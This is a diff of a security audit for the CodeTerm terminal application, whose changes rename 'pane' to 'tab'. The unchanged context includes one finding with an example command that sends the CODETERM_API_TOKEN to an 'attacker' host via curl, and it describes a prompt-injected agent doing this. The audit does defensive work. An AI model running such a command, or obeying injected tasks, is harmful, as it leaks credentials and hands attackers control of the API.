@@ -4,7 +4,7 @@ Read-only audit of CodeTerm across four attack surfaces (REST/socket API,
 JS plugin sandbox, mesh networking, secrets/spawn/CLI), plus the fixes applied
 on the `security` branch. Threat model: a host on the same LAN/tailnet, a
 malicious/compromised plugin, another local user, and a prompt-injected agent
-task running in a pane.
+task running in a Tab.
 
 Severity: **Critical** = remote/unauth compromise; **High** = auth'd escalation
 or credential exposure; **Medium/Low** = hardening.
@@ -92,7 +92,7 @@ token.
 as `CODETERM_API_TOKEN` in every spawned agent's env. A prompt-injected task can
 `curl -d "$CODETERM_API_TOKEN" attacker` and the attacker then drives the API
 from anywhere on the network. **Recommended:** default-bind loopback (opt-in for
-`0.0.0.0` with a warning); inject a per-pane `AgentIsolated`-scoped token, not
+`0.0.0.0` with a warning); inject a per-tab `AgentIsolated`-scoped token, not
 the master.
 
 ### Medium — Relay SSRF: peer controls the forwarded path
@@ -116,7 +116,7 @@ restrictive ACL on Windows too.
 
 ## Verified SAFE (checked, no action)
 
-- `exec_in_pane` / `send_text` / `spawn` — no shell string-building; input is
+- `exec_in_tab` / `send_text` / `spawn` — no shell string-building; input is
   PTY bytes or argv. The PTY is a shell by design, fully behind auth.
 - Git endpoints — `Command::new("git").arg(...)` argv form; sha validated; user
   paths after `--`. No injection.
@@ -134,4 +134,4 @@ restrictive ACL on Windows too.
 - CORS permissive but auth is header-bearer (not cookie), so no ambient-credential
   CSRF — though tighten origins as defense-in-depth given the open bind.
 
-<!-- revision: 2 -->
+<!-- revision: 3 -->
